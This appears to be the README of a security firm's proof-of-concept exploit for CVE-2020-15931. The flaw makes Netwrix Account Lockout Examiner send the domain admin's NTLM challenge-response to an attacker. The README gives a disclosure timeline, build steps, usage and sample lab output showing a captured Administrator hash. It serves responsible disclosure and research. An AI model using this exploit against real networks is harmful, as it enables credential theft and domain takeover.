# CVE-2020-15931
#### Netwrix Account Lockout Examiner 4.1 Domain Admin Account Credential Disclosure Vulnerability

## Vulnerbility Overview
Netwrix Account Lockout Examiner (ALE) before 5.1 allows an unauthenticated, remote adversary to trigger a connection to an attacker-controlled system and capture the NTLMv1/v2 challenge-response of an account with domain administrator privileges. The domain administrator account would already be configured with the product as required for installation. An adversary can exploit this by generating a single Kerberos Pre-Authentication Failed (Event ID 4771) event on a domain controller.

More details about the vulnerability can be found on the following [Blog](https://www.optiv.com/explore-optiv-insights/source-zero/netwrix-account-lockout-examiner-41-disclosure-vulnerability?utm_source=oth&?utm_medium=dig&?utm_content=blg?cid=prt:red-netwrix-lockout-examiner:thl:som:sze:int:Q3:2020::ALL)

![image](https://github.com/optiv/CVE-2020-15931/blob/master/netwrix_attack.png)

## Credits
The vulnerability was discovered in the wild by Robert Surace ([@robsauce](https://github.com/ROBSAUCE)) and Daniel Min ([@bigb0ss](https://github.com/bigb0sss)), Optiv Security Consultants while performing a security assessment. Upon identification of CVE-2020-15931, Optiv immediately contacted Netwrix to disclose the identified flaw responsibly. 

## Vulnerability Disclosure Timeline
* June 09, 2020 – Vulnerability discovered by Optiv
* June 15, 2020 – Disclosed by Optiv to vendor
* July 14, 2020 – Vendor acknowledged the issue and agreed to release the fixed version
* July 23, 2020 – Disclosed to CNA (MITRE Corporation)
* July 24, 2020 – Vendor released the fixed version of the Netwrix Account Lockout Examiner 5.1
* July 24, 2020 – CVE-2020-15931 assigned by CNA (MITRE Corporation)
* August 13, 2020 – Disclosed to the public
* October 30, 2020 - Base Score 7.5 High assigned by NVD (National Vulnerability Database)

## Exploit Script
### Installation
The exploit script was developed in golang. Install the following dependencies:
```
go get github.com/fatih/color
go get github.com/ropnop/gokrb5/client
go get github.com/ropnop/gokrb5/config
```

It also utilizes the smbserver.py from [Impacket](https://github.com/SecureAuthCorp/impacket). 
```
pip install impacket
```

Finally, download the exploit script and build it.
```
git clone https://github.com/optiv/CVE-2020-15931
go build cve-2020-15931.go
```

### Usage
```
$  ./cve-2020-15931

     _______      ________    ___   ___ ___   ___        __ _____ ___ ____  __ 
    / ____\ \    / /  ____|  |__ \ / _ \__ \ / _ \      /_ | ____/ _ \___ \/_ |
   | |     \ \  / /| |__ ______ ) | | | | ) | | | |______| | |__| (_) |__) || |
   | |      \ \/ / |  __|______/ /| | | |/ /| | | |______| |___ \\__, |__ < | |
   | |____   \  /  | |____    / /_| |_| / /_| |_| |      | |___) | / /___) || |
    \_____|   \/   |______|  |____|\___/____|\___/       |_|____/ /_/|____/ |_|
                                                         [robSauce & bigb0ss]  v1.0

   [+] Netwrix Account Lockout Examiner 4.1 Exploit Script

 
    Required:
    -d            Domain name
    -dc           Domain controller 
    -u            Valid username 
    
    Optional:
    -h            Print this help menu

    Example:
    ./cve-2020-15931 -d target.com -dc 10.10.0.2 -u jsmith

```

### Exploit
<i>(Note: At the time of writing, this attack can only be identified via a blind-based attack. This is because it is difficult
to determine if the target organization is using Netwrix Account Lockout Examiner on their network to audit account authentications or not.)</i>
```
$ ./cve-2020-15931 -d bosslab.com -dc 10.10.0.2 -u b0ss1

     _______      ________    ___   ___ ___   ___        __ _____ ___ ____  __ 
    / ____\ \    / /  ____|  |__ \ / _ \__ \ / _ \      /_ | ____/ _ \___ \/_ |
   | |     \ \  / /| |__ ______ ) | | | | ) | | | |______| | |__| (_) |__) || |
   | |      \ \/ / |  __|______/ /| | | |/ /| | | |______| |___ \\__, |__ < | |
   | |____   \  /  | |____    / /_| |_| / /_| |_| |      | |___) | / /___) || |
    \_____|   \/   |______|  |____|\___/____|\___/       |_|____/ /_/|____/ |_|
                                                         [robSauce & bigb0ss]  v1.0

   [+] Netwrix Account Lockout Examiner 4.1 Exploit Script

[+] DC: 	10.10.0.2
[+] Domain: 	bosslab.com
[+] Username: 	b0ss1
[+] Password: 	wrongPass
[+] Event ID 4771 (Kerberos Pre-Authentication Failed) Triggered!
[+] If vulnerable, you will get a NTLMv1/2 of the Netwrix service account.
[+] SMB Server Started...

Impacket v0.9.22.dev1+20200607.100119.b5c61678 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.0.2,59264)
[*] AUTHENTICATE_MESSAGE(BOSSLAB\Administrator,BOSSLAB-DC01)
[*] User BOSSLAB-DC01\Administrator authenticated successfully
[*] Administrator::BOSSLAB:17dcc32c6eafc48d:f798e7c906eb1b639722614f1417ded1:0101000000000000be18...REDACTED...0000000
[*] Disconnecting Share(1:IPC$)
[*] Closing down connection (10.10.0.2,59264)
[*] Remaining connections []
```
## References
[Netwrix Account Lockout Examiner 5.1](https://www.netwrix.com/account_lockout_examiner.html) <br/>
[Event ID 4771](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4771) <br/>
[Impacket smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) <br/>
[Gokrb5 Client](https://github.com/ropnop/gokrb5) <br/>
[CVE-2020-15931](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15931) <br/>


